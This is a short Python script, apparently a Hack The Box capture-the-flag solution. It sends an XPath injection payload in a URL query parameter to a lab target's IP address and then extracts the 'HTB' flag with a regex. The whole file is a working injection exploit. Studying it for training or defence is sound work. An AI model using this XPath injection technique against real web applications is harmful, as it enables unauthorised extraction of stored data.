import http
import requests
import re

import requests
import re

#Fetch the output of the web page using X-path data exfiltration
r = requests.get(url = "http://94.237.56.140:35461/?q=SOMETHINGINVALID&f=fullstreetname+|+/*[1]/*[2]/*[3]/*[1]/*[3]", stream=True)

#Filter the output to only contain the flag (private key)
matches = re.findall(r"HTB..................................", r.text)
print(matches)